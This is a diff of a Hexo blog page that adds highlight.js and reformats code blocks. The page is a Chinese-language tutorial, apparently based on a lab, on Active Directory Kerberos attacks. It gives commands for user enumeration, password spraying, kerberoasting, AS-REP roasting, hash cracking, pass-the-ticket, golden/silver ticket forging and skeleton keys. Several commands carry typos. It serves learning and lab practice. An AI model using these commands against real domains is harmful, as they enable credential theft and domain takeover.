@@ -11,6 +11,9 @@
 <meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="s4mmy's blog" type="application/atom+xml">
 </head>
 <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css">
+ <!-- 添加这行：Highlight.js JavaScript库 -->
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+</head>
     
     <body>
         <header class="header">
@@ -119,14 +122,14 @@
 <p>3.) <code>chmod +x kerbrute</code> - 使 kerbrute 可执行</p>
 </blockquote>
 <h3 id="Kerbrute使用"><a href="#Kerbrute使用" class="headerlink" title="Kerbrute使用"></a>Kerbrute使用</h3><p>进入kerbrute目录后，准备好爆破用用户名字典，使用以下命令运行Kerbrute爆破域中存在的账户</p>
-<pre class="line-numbers language-none"><code class="language-none">.&#x2F;kerbrute usernum --dc CONTROLLER.local -d CONTROLLER.local User.txt</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute usernum --dc CONTROLLER.local -d CONTROLLER.local User.txt</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="使用Rubeus暴力破解-x2F-收割票证"><a href="#使用Rubeus暴力破解-x2F-收割票证" class="headerlink" title="使用Rubeus暴力破解&#x2F;收割票证"></a>使用Rubeus暴力破解&#x2F;收割票证</h2><p>Rubeus是用于攻击Kerberos的工具。Rubeus是kekeo工具的改编版，更加强大。Rubeus具有多种攻击方式和功能，包括跨越哈希（Overpass the hash&#x2F;Pass-the-Key），票证请求（Ticket Request）和票证延期（renewals），票证管理，票证提取，收获，传递票证（pass the ticket），AS-REP烘焙（AS-REP Roasting）和kerberoasting</p>
 <h3 id="使用rubeus获取票证"><a href="#使用rubeus获取票证" class="headerlink" title="使用rubeus获取票证"></a>使用rubeus获取票证</h3><p>通过截获正在传递到KDC的票证并将其保存以用于其他攻击，例如PTT</p>
 <p>攻击命令如下</p>
-<pre class="line-numbers language-none"><code class="language-none">Rubeus.exe harvest &#x2F;interval:30</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe harvest /interval:30</span><br></pre></td></tr></table></figure>
 
 <p>该命令告诉RUbeus每30s收集一次TGT</p>
 <h3 id="使用Rubeus进行暴力破解密码-x2F-密码喷射"><a href="#使用Rubeus进行暴力破解密码-x2F-密码喷射" class="headerlink" title="使用Rubeus进行暴力破解密码&#x2F;密码喷射"></a>使用Rubeus进行暴力破解密码&#x2F;密码喷射</h3><blockquote>
@@ -134,10 +137,10 @@
 <p>此攻击将获取给定的基于 Kerberos 的密码，并将其喷洒到所有找到的用户上，并提供 .kirbi 票证。该票证是一个TGT，可用于从 KDC 获取服务票证，也可用于诸如传递票证攻击之类的攻击。</p>
 </blockquote>
 <p>在使用Rubeus进行密码喷洒之前，，需要将域控制器域名添加到windows的主机文件中。可以直接使用echo命令将IP和域名添加到计算机的主机文件中</p>
-<pre class="line-numbers language-none"><code class="language-none">echo 10.01.147.97 CONTROLLER.local &gt;&gt; C:\Windows\System32\drivers\etc\hosts</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 10.01.147.97 CONTROLLER.local &gt;&gt; C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>
 
 <p>Rubeus喷洒密码命令</p>
-<pre class="line-numbers language-none"><code class="language-none">Rubeus.exe brute &#x2F;password:Password1 &#x2F;noticket</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe brute /password:Password1 /noticket</span><br></pre></td></tr></table></figure>
 
 <p>以上命令将使用给定密码（上面命令中指定的是Password1）喷洒到所有找到的账户中，然后为该用户提供.kirbi TGT（即将上文中抓取到的TGT给现在爆破出来的用户使用）</p>
 <p>ps：在进行像喷洒密码这种包里攻击时大概率会触发安全策略而导致账户锁定。</p>
@@ -146,13 +149,13 @@
 <p>这里将使用Rubeus和Impacket进行攻击，同样的使用kekeo和Invoke-Kerberoast也能进行攻击。</p>
 <h3 id="使用Rubeus进行Kerberoasting"><a href="#使用Rubeus进行Kerberoasting" class="headerlink" title="使用Rubeus进行Kerberoasting"></a>使用Rubeus进行Kerberoasting</h3><p>ps：以下操作是在内网机器上进行操作的。</p>
 <p>以下命令将转储任何kerberoastable用户的Kerberos哈希值</p>
-<pre class="line-numbers language-none"><code class="language-none">Rubeus.exe kerberoast</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.imgur.com/XZegVqf.png"></p>
 <p>将获得的hash储存到本地的.txt文件中，然后使用hashcat破解它。</p>
 <p>使用hashcat破解需要提前准备好密码字典</p>
 <p>破解命令</p>
-<pre class="line-numbers language-none"><code class="language-none">hashcat -m 13100 -a 0 hash.txt password.txt</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 -a 0 hash.txt password.txt</span><br></pre></td></tr></table></figure>
 
 
 
@@ -165,15 +168,15 @@
 <p>4.) <code>pip install .</code>- 这将安装所有需要的依赖项</p>
 </blockquote>
 <p>Impacket使用命令</p>
-<pre class="line-numbers language-none"><code class="language-none">cd &#x2F;usr&#x2F;share&#x2F;doc&#x2F;python3-impacket&#x2F;examples &#x2F;&#x2F;进入GetUserSPNs.py所在位置</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/doc/python3-impacket/examples //进入GetUserSPNs.py所在位置</span><br></pre></td></tr></table></figure>
 
 
 
-<pre class="line-numbers language-none"><code class="language-none">sudo python3 GetUserSPNs.py controller.local(域名)&#x2F;Machine1(机器名称):Password(密码) -dc-ip 目标机器IP -request</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 GetUserSPNs.py controller.local(域名)/Machine1(机器名称):Password(密码) -dc-ip 目标机器IP -request</span><br></pre></td></tr></table></figure>
 
 <p>↑这将转储它可以在目标域上找到的所有kerberoastable账户的kerberos哈希值，就像Rubeus所做的那样；但是与Rubeus不同的是它不用再目标机器上进行操作，并且可以远程完成。</p>
 <p>破解hash步骤相同</p>
-<pre class="line-numbers language-none"><code class="language-none">hashcat -m 13100 -a 0 hash.txt Pass.txt</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 -a 0 hash.txt Pass.txt</span><br></pre></td></tr></table></figure>
 
 
 
@@ -191,11 +194,11 @@
 <p>同样的，不止Rubeus可以进行AS-REP Roasting ，keko和impacket的GetNPUsers.py也行。不过Rubeus更易用，它会自动查找AS-REP Roastable用户，而使用GetNPUsers必须事先枚举用户并知道那些用户是AS-REP Roastable。</p>
 <h3 id="AS-REP-Roasting-概述"><a href="#AS-REP-Roasting-概述" class="headerlink" title="AS-REP Roasting 概述"></a>AS-REP Roasting 概述</h3><p>在预身份验证期间，用户hash将用于加密时间戳，域控制器将尝试解密时间戳以验证是否正在使用正确的哈希并且不会重播先前的请求( the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request)。</p>
 <p>验证时间戳后，KDC将为用户颁发TGT。如果禁用预身份验证，你可以请求任何复用的任何身份验证数据，并且KDC将返回一个可以离线破解的加密TGT，因为KDC会跳过验证用户真是身份步骤（可以伪装用户身份）</p>
-<h3 id="使用Rubeus转储kerbasrep5哈希值"><a href="#使用Rubeus转储kerbasrep5哈希值" class="headerlink" title="使用Rubeus转储kerbasrep5哈希值"></a>使用Rubeus转储kerbasrep5哈希值</h3><pre class="line-numbers language-none"><code class="language-none">Rubeus.exe aseproast</code></pre>
+<h3 id="使用Rubeus转储kerbasrep5哈希值"><a href="#使用Rubeus转储kerbasrep5哈希值" class="headerlink" title="使用Rubeus转储kerbasrep5哈希值"></a>使用Rubeus转储kerbasrep5哈希值</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe aseproast</span><br></pre></td></tr></table></figure>
 
 <p>以上命令将运行 AS-REP Roast 命令来查找易受攻击的用户，然后转储找到的易受攻击的用户哈希值。</p>
 <p>获取hash后继续使用hashcat进行破解</p>
-<pre class="line-numbers language-none"><code class="language-none">hashcat -m 18200 hash.txt Passwd.txt &#x2F;&#x2F;Rubeus AS-REP 烘焙使用 hashcat 模式 18200 </code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 hash.txt Passwd.txt //Rubeus AS-REP 烘焙使用 hashcat 模式 18200 </span><br></pre></td></tr></table></figure>
 
 
 
@@ -215,14 +218,14 @@
 <p>当使用mimikatz转储票证时，它会给我们一个.kirbi票证。如果域管理员票证位于LSASS内存中，则可以使用该票证获得域管理员。如果存在不安全的与服务账户票证，则此攻击对于权限提升和横向移动非常有用。</p>
 <p>如果转储域管理员的票证，然后使用mimikatz PTT攻击模拟该票证，便可以通过该攻击升级为域管理员。PTT攻击的原理就是重用现有票证，并不会创建或者销毁任何票证，只是重用域中其他用户的现有票证并冒充该票证。</p>
 <h3 id="mimikatz使用"><a href="#mimikatz使用" class="headerlink" title="mimikatz使用"></a>mimikatz使用</h3><p>cmd输入以下命令启动mimikatz（需要管理员权限）</p>
-<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br></pre></td></tr></table></figure>
 
 <p>输入一下命令来检查是否以管理员权限运行</p>
-<pre class="line-numbers language-none"><code class="language-none">privilege::debug</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure>
 
 <p>如果正确，则输出[output ‘20’ OK]</p>
 <p><img src="https://i.imgur.com/SJQGplV.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">sekulsa::ticket &#x2F;export</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekulsa::ticket /export</span><br></pre></td></tr></table></figure>
 
 <p>上面的命令会将所有的.kribi票证导出到当前目录中</p>
 <blockquote>
@@ -232,7 +235,7 @@
 <p><img src="https://i.imgur.com/xC0L5Kf.png"></p>
 <h3 id="使用mimikatz进行PTT"><a href="#使用mimikatz进行PTT" class="headerlink" title="使用mimikatz进行PTT"></a>使用mimikatz进行PTT</h3><p>我们现在已经准备好了飘逸，可以进行PTT攻击获得域管理员权限。</p>
 <p>在mimikatz中执行以下命令</p>
-<pre class="line-numbers language-none"><code class="language-none">kerberos::ptt &lt;ticket&gt;</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt &lt;ticket&gt;</span><br></pre></td></tr></table></figure>
 
 <p>上面的ticket是上文中转储的.kirbi票据的全称</p>
 <p><img src="https://i.imgur.com/DwXmm8Z.png"></p>
@@ -248,17 +251,17 @@
 <h3 id="金银票攻击概述"><a href="#金银票攻击概述" class="headerlink" title="金银票攻击概述"></a>金银票攻击概述</h3><p>金票攻击的工作原理是转储域中任何用户的票证授予票（TGT），这最好是域管理员。</p>
 <p>但是对于金票，要转储的是krbtgt票，对于银票，要转储的是域管理员票。这将为你提供服务&#x2F;域管理员账户的SID或安全标识符（每个用户账户的唯一标识符）以及NTLM哈希，然后可以再mimikat黄金票据攻击中使用这些详细信息，以创建模拟给定服务账户信息的TGT。</p>
 <h3 id="转储krbtgt哈希"><a href="#转储krbtgt哈希" class="headerlink" title="转储krbtgt哈希"></a>转储krbtgt哈希</h3><p>确保mimikatz是以管理员身份运行</p>
-<pre class="line-numbers language-none"><code class="language-none">lsadump::lsa &#x2F;inject &#x2F;name:krbtgt</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::lsa /inject /name:krbtgt</span><br></pre></td></tr></table></figure>
 
 <p>以上命令将转储hash以及创建金票据所需的安全标识符。</p>
 <p>如果要创建银票，需要更改<code>/name:要转储的域管理员账户或者服务账户（例如 SQLService）</code>的hash</p>
 <p><img src="https://i.imgur.com/VOEsU4O.png"></p>
-<h3 id="创建金-x2F-银票"><a href="#创建金-x2F-银票" class="headerlink" title="创建金&#x2F;银票"></a>创建金&#x2F;银票</h3><pre class="line-numbers language-none"><code class="language-none">Kerberos::golden &#x2F;user:Administrator &#x2F;domain:ontroller.local &#x2F;sid: &#x2F;krbtgt: &#x2F;id:</code></pre>
+<h3 id="创建金-x2F-银票"><a href="#创建金-x2F-银票" class="headerlink" title="创建金&#x2F;银票"></a>创建金&#x2F;银票</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kerberos::golden /user:Administrator /domain:ontroller.local /sid: /krbtgt: /id:</span><br></pre></td></tr></table></figure>
 
 <p>以上是创建金票的命令，创建银票只需要将服务NTLMhash放入krbtgt槽中，服务账户的sid放入sid，并将id更改为103</p>
 <p>金票据创建实例图</p>
 <p><img src="https://i.imgur.com/rh06qDl.png"></p>
-<h3 id="使用金银票访问其他机器"><a href="#使用金银票访问其他机器" class="headerlink" title="使用金银票访问其他机器"></a>使用金银票访问其他机器</h3><pre class="line-numbers language-none"><code class="language-none">misc::cmd</code></pre>
+<h3 id="使用金银票访问其他机器"><a href="#使用金银票访问其他机器" class="headerlink" title="使用金银票访问其他机器"></a>使用金银票访问其他机器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">misc::cmd</span><br></pre></td></tr></table></figure>
 
 <p>使用以上命令将在mimikatz中<strong>使用给定的票证</strong>打开一个新的提升命令提示符</p>
 <p><img src="https://i.imgur.com/6HnEnwi.png"></p>
@@ -274,7 +277,7 @@
 </blockquote>
 <h3 id="万能钥匙概述"><a href="#万能钥匙概述" class="headerlink" title="万能钥匙概述"></a>万能钥匙概述</h3><p>万能钥匙的工作原理是滥用AS-REQ加密时间戳。时间戳是使用用户NT hash进行加密的，然后域控制器尝试使用用户NT hash来解密此时间戳，一但植入万能钥匙，域控制器将尝试使用用户NT hash和万能钥匙NT hash来解密时间戳，从而允许攻击者访问域林。</p>
 <h3 id="使用mimikatz安装万能钥匙"><a href="#使用mimikatz安装万能钥匙" class="headerlink" title="使用mimikatz安装万能钥匙"></a>使用mimikatz安装万能钥匙</h3><p>以管理员模式打开mimikatz</p>
-<pre class="line-numbers language-none"><code class="language-none">misc:skeleton</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">misc:skeleton</span><br></pre></td></tr></table></figure>
 
 <p>只需要上面一条命令即可</p>
 <h3 id="进入域林"><a href="#进入域林" class="headerlink" title="进入域林"></a>进入域林</h3><p>默认凭据为：“ <em>mimikatz</em> ”</p>
@@ -285,8 +288,10 @@
 
     </div>
 </article>
-
+<!--把higlightAll放到最后，确保DOM都加载完成-->
+<script>hljs.highlightAll();</script>
 <script src="/js/codeblock.js"></script>
+
 <!--显示文章页相关内容-->
             <!--body是一个变量，代表页面的主要内容。在渲染模板时，这个变量会被替换为实际的内容。-->
             
